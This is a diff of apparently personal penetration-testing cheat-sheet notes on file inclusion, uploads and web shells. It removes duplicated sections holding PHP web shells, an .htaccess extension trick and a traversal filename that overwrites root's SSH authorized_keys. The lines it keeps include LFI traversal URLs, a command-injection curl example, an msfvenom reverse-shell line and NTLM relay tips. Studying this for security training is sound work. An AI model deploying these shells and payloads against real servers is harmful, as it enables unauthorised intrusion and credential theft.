@@ -2,7 +2,7 @@ Determine language - `feroxbuster` or `burp` to navigate `index.html`, `index.ph
 	[Web Extension Wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)
 
 ---
-# File Inclusion Uploads and Git Exposure
+# File Inclusion and Git Exposure
 
 File read/write abuse, LFI/RFI, wrapper abuse, upload bypasses, web shells, and exposed Git data.
 Keep traversal probes and upload tradecraft together because many real paths blend both classes during exploitation.
@@ -242,43 +242,6 @@ console.log(encoded);
 127.0.0.1:8000/backend/?view=../../../../../var/crash/test.php&cmd=id
 ```
 
-## File upload
-
-```
-$ cat .htaccess
-AddType application/x-httpd-php .evil
-
-$ cat simple-backdoor.evil
-<?php
-if(isset($_REQUEST['cmd'])){
-        echo "<pre>";
-        $cmd = ($_REQUEST['cmd']);
-        system($cmd);
-        echo "</pre>";
-        die;
-}
-?>
-
-http://192.168.204.187/uploads/simple-backdoor.evil?cmd=whoami
-```
-💡 If we can upload a webshell and access it in /uploads - GG! - Can be used with combo with directory traversal / LFI - abuse the upload path in Burp to put it in /var and then access it like here `http://240.0.0.1:8000/backend/?view=../../../../../../../../etc/passwd`, `http://240.0.0.1:8000/backend/?view=../../../../../../../../var/cmd.php&cmd=whoami`
-💡 Non executable - Could try to overwrite ssh keys: In burp: `filename=../../../../../../../root/.ssh/authorized\_keys `
-💡 Good place to upload webshells: `C:\\xampp\\htdocs\\html-php-backdoor.php` We can check this path via `phpinfo.php` on DOCUMENT\_ROOT  `curl[http://192.168.120.132:45332/phpinfo.php | grep 'DOCUMENT\_ROOT' | html2text`
-💡 If we have something that looks like a direct command on the os - We can try to abuse it with URL encoded ‘`;`’ `/` ‘`&&`’ /‘`&`’. Example from course:
-```bash
-curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
-```
-
-## Web Shells
-
-```
-<?php system($_GET['cmd']); ?>
-<?php echo exec($_POST['cmd']); ?>
-<?php echo passthru($_GET['cmd']); ?>
-<?php passthru($_REQUEST['cmd']); ?>
-<?php echo system($_REQUEST['shell']): ?>
-```
-
 ---
 
 ## LFI
@@ -316,50 +279,6 @@ msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=9001 -o shell.php
 when we can inject a remote path, especially \\kali\_ip\\test (smb directory) we can use responder to get the ntlm or ntlmx relay to relay it.
 
 💡 If we cannot crack the NetNTLMv2 hash we still can try to \[Relaying Net-NTLMv2\]([https://www.notion.so/Relaying-Net-NTLMv2-55e13d96ef574f60a44c3ea618334087?pvs=21](https://www.notion.so/Relaying-Net-NTLMv2-55e13d96ef574f60a44c3ea618334087?pvs=21)). In the course they showed that if admin02 is connected on files01 we can relay the NetNTLMv2 through our Kali to files02 and gain a shell on files02.
-
-## File upload
-
-```
-$ cat .htaccess
-AddType application/x-httpd-php .evil
-
-$ cat simple-backdoor.evil
-<?php
-if(isset($_REQUEST['cmd'])){
-        echo "<pre>";
-        $cmd = ($_REQUEST['cmd']);
-        system($cmd);
-        echo "</pre>";
-        die;
-}
-?>
-
-http://192.168.204.187/uploads/simple-backdoor.evil?cmd=whoami
-```
-
-💡 If we can upload a webshell and access it in /uploads - GG! - Can be used with combo with directory traversal / LFI - abuse the upload path in Burp to put it in /var and then access it like here [[http://240.0.0.1:8000/backend/?view=../../../../../../../../etc/passwd](http://240.0.0.1:8000/backend/?view=../../../../../../../../etc/passwd) [http://240.0.0.1:8000/backend/?view=../../../../../../../../var/cmd.php&cmd=whoami\](Cheat%20sheet%20b2ec1956b01746ed807a1363890b898f.md)](http://240.0.0.1:8000/backend/?view=../../../../../../../../var/cmd.php&cmd=whoami]\(Cheat%20sheet%20b2ec1956b01746ed807a1363890b898f.md\))
-💡 Non executable - Could try to overwrite ssh keys: In burp:
-
-`filename=../../../../../../../root/.ssh/authorized\_keys `
-
-💡 Good place to upload webshells: `C:\\xampp\\htdocs\\html-php-backdoor.php `We can check this path via `phpinfo.php` on
-
-`DOCUMENT\_ROOT \`curl [http://192.168.120.132:45332/phpinfo.php](http://192.168.120.132:45332/phpinfo.php) | grep 'DOCUMENT\_ROOT' | html2text\`
-
-💡 If we have something that looks like a direct command on the os - We can try to abuse it with URL encoded ‘;’ / ‘&&’ / ‘&’. Example from course:
-
-`curl -X POST --data 'Archive=git%3Bipconfig'` [http://192.168.50.189:8000/archive](http://192.168.50.189:8000/archive)
-
-- If web shell just shows source code:
-	- The server didn't render the shell at all due to the unknown extension.
-	- It can be noticed that the server running on the machine is apache.
-	- So we could potentially upload a ".htaccess" file to the directory to let the server render my ".xxx" extension as PHP script. John Hammond has a [video](https://www.youtube.com/watch?v=xZd1JWmLGLk) to explain it well.
-	- We have to make our own `.htaccess` file
-```shell
-echo "AddType application/x-httpd-php .xxx" > .htaccess
-```
-- After we upload that file, upload webshell with `.xxx` extension and it will take it
-
 ## Null Byte
 
 ```
